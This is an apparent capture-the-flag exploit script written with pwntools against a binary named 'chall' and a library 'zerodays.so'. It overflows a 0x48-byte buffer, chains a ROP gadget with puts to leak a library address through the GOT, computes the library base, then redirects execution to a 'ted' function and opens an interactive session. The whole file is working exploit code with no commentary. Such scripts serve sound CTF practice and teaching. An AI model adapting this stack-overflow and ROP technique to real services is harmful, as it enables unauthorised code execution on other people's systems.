from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
libc_path = "./libc.so.6"
zd_path = "./zerodays.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
elf_zd = ELF(zd_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


ddebug()
"""
0x00000000004012c2 : pop rdi ; ret
"""
pop_rdi = 0x4012c2
main_adr =  0x4012c7 

jack = elf_zd.symbols["jack"]
log.success("jack:-----> " + hex(jack))

payload = b"t"* 0x48
payload += p64(pop_rdi)
payload += p64(elf.got["jack"])
payload += p64(elf.plt["puts"])
payload += p64(main_adr)


io.sendlineafter("Input:\n", payload)

elf_zd.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - jack
log.success("zd:-----> " + hex(elf_zd.address))

ted = elf_zd.symbols["ted"]
payload = b"t"* 0x48
payload += p64(ted)


io.sendlineafter("Input:\n", payload)



io.interactive()
